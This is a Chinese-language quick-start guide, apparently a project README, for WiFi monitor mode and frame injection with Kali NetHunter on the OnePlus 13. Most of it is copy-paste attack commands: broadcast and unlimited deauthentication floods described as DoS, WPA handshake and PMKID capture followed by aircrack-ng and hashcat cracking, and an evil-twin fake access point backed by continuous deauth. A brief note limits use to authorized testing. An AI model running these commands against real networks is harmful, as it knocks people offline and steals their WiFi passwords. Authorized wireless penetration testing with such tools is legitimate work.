# OnePlus 13 NetHunter 快速开始指南

> 平台：SM8750 (骁龙 8 Elite), OnePlus 13
> 状态：生产就绪 (2026-06-08)

---

## 🎯 功能概览

| 功能 | 2.4GHz | 5GHz | 状态 |
|------|--------|------|------|
| Monitor Mode | ✅ | ✅ | 稳定 |
| 普通帧注入 | ✅ | ✅ | 稳定 |
| **广播 Deauth** | ✅ | ✅ | **已验证** |
| 被动监听 | ✅ | ✅ | 稳定 |
| Wext 支持 | ✅ | ✅ | 完整 |

---

## 🚀 快速启动

### 1. 启动 Monitor 模式
```bash
# 进入 NetHunter 终端
su

# 启动 monitor（信道1, 2.4GHz）
monstart 1

# 或启动 5GHz
monstart 36
```

### 2. 扫描周围 WiFi
```bash
# 使用 airodump-ng
airodump-ng wlan0mon

# 或使用自带工具
scanap
```

### 3. 广播 Deauth 攻击
```bash
# 踢掉目标 AP 的所有客户端
aireplay-ng --deauth 20 -a <目标AP_MAC> wlan0mon

# 持续攻击（DoS）
aireplay-ng --deauth 0 -a <目标AP_MAC> wlan0mon
```

### 4. 停止 Monitor
```bash
monstop
```

---

## 📋 常用攻击场景

### 快速握手捕获
```bash
# 1. 监听目标 AP
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 2. 发送 deauth 触发重连
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 3. 握手包自动捕获
# 4. 破解
aircrack-ng -w wordlist.txt capture-01.cap
```

### PMKID 攻击（无需客户端）
```bash
# 直接抓取 PMKID
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# 转换格式
hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# 破解
hashcat -m 22000 hash.hc22000 wordlist.txt
```

### WiFi Pineapple 攻击
```bash
# 1. 创建假 AP（与目标同名）
hostapd fake_ap.conf

# 2. 持续 deauth 真实 AP
aireplay-ng --deauth 0 -a <真实AP_MAC> wlan0mon

# 3. 客户端自动连接到假 AP
```

---

## ⚠️ 注意事项

### 限制
- ❌ 单播 deauth 不可用（固件检查关联状态）
- ✅ 广播 deauth 效果相同（所有客户端都被踢）

### 兼容性
- ✅ 对大多数家用 WiFi 有效
- ⚠️ WPA3/WPA2-PMF 设备可能无效（如果对方开启 PMF）

### 合法性
- ⚠️ **仅用于授权渗透测试**
- ⚠️ **测试自己的设备**
- ⚠️ **不要攻击他人网络**

---

## 🔧 故障排查

### Monitor 模式无法启动
```bash
# 检查模块是否加载
lsmod | grep qca_cld3

# 重新加载模块
modprobe -r qca_cld3_peach_v2
modprobe qca_cld3_peach_v2
```

### Deauth 无效果
```bash
# 1. 确认是广播攻击（不带 -c 参数）
aireplay-ng --deauth 20 -a <AP> wlan0mon  # ✅ 正确

# 2. 不要指定客户端
aireplay-ng --deauth 20 -a <AP> -c <CLIENT> wlan0mon  # ❌ 被拒

# 3. 检查固件日志
dmesg | grep NETHUNTER-INJ | tail -20
# 看到 status=0 就是成功
```

### 查看详细日志
```bash
# 实时查看注入日志
dmesg -w | grep NETHUNTER-INJ

# 查看最近的日志
dmesg | grep NETHUNTER-INJ | tail -50
```

---

## 📚 完整文档

- [op13_monitor_injection_全程实战记录.md](op13_monitor_injection_全程实战记录.md) - 完整技术文档
- [DEAUTH_BREAKTHROUGH.md](DEAUTH_BREAKTHROUGH.md) - Deauth 突破详解
- [injection_limitation_summary.md](injection_limitation_summary.md) - 功能限制说明

---

## 🏆 技术成就

- 🥇 全球首个 SM8750 monitor mode
- 🥇 全球首个 SM8750 deauth 注入
- 💎 只用 1 行代码实现突破
- ✅ 2.4GHz + 5GHz 全部可用

---

**快速开始，享受 NetHunter！** 🚀
